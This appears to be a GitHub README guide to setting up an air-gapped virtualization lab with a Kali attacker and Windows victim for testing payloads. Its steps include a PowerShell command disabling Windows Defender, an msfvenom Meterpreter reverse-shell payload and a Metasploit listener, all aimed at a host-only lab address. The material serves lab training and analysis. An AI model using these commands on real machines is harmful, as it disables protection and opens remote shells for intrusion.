
# Building an Isolated Virtualization Lab for Advanced Payload Testing  
**Author:** Adrian Obungu 
**GitHub Repo:** https://github.com/Adrian-Obungu/Isolated-Virtualization-Lab
**Last Updated:** 4|25|2025  

---

## 1. Introduction  
This guide provides a step-by-step process to create a **secure, air-gapped lab** for testing exploits, malware, and penetration techniques without risking real-world systems.  

---

## 2. Lab Objectives  
- Isolate lab environments from production networks.  
- Safely execute and analyze advanced payloads.  
- Monitor attacks using network/host-based tools.  

---

## 3. Hardware & Software Requirements  

### Hardware  
| Component | Specification |  
|-----------|---------------|  
| CPU       | Intel VT-x/AMD-V Enabled |  
| RAM       | 16GB+ (8GB minimum) |  
| Storage   | 200GB+ SSD |  

### Software  
| Tool | Purpose |  
|------|---------|  
| VMware/VirtualBox | Hypervisor |  
| Kali Linux | Attacker OS |  
| Windows 10 VM | Victim machine |  
| Wireshark | Network analysis |  

---

## 4. Virtualization Setup  

### 4.1 Install Hypervisor  
1. **VMware Workstation Pro**:  
   - Download from [VMware](https://www.vmware.com/products/workstation-pro.html).  
   - Enable virtualization in BIOS/UEFI.  

2. **VirtualBox**:  
   - Free alternative: [Download Here](https://www.virtualbox.org/).  

### 4.2 Configure Host-Only Networking  
- **VMware**:  
  - Go to `Edit > Virtual Network Editor > Add Network (Host-Only)`.  
- **VirtualBox**:  
  - Navigate to `File > Preferences > Network > Host-Only Networks`.  

---

## 5. Attacker & Victim VM Configuration  

### 5.1 Attacker Machine (Kali Linux)  
1. **Install Kali Linux**:  
   ```bash
   sudo apt update && sudo apt install metasploit-framework nmap -y
   ```  

2. **Start Metasploit Database**:  
   ```bash
   msfdb init && msfdb start
   ```  

### 5.2 Victim Machine (Windows)  
1. **Disable Windows Defender**:  
   ```powershell
   Set-MpPreference -DisableRealtimeMonitoring $true
   ```  

2. **Create Shared Folder**:  
   - VMware: `VM Settings > Options > Shared Folders`.  

---

## 6. Payload Execution & Monitoring  

### 6.1 Generate a Payload  
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.5 LPORT=4444 -f exe > payload.exe
```  

### 6.2 Execute & Monitor  
1. Transfer `payload.exe` to the victim via shared folders.  
2. Start a Metasploit listener:  
   ```bash
   msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.5; set LPORT 4444; run"
   ```  

3. **Analyze Traffic in Wireshark**:  
   ```plaintext
   Filter: ip.src == 192.168.56.5 && tcp.port == 4444
   ```  

---

## 7. Safety Best Practices  
- ✅ Use **snapshots** before testing.  
- ✅ Block internet access with a firewall (e.g., pfSense).  
- ❌ Never use real data in victim VMs.  

---

## 8. Troubleshooting  
| Issue | Solution |  
|-------|----------|  
| "VM not starting" | Enable virtualization in BIOS/UEFI. |  
| "Payload fails" | Verify host-only network IPs. |  
| "No internet in VMs" | Ensure NAT is disabled. |  

---

## 9. Generate a PDF  
1. Install **Pandoc** and **LaTeX** (see [installation steps](#)).  
2. Run:  
   ```bash
   pandoc Isolated_Lab_Guide.md -o Isolated_Lab_Guide.pdf --pdf-engine=xelatex
   ```  

---

## License  
This project is licensed under the [MIT License](LICENSE).  

**[⬆ Back to Top](#building-an-isolated-virtualization-lab-for-advanced-payload-testing)**  
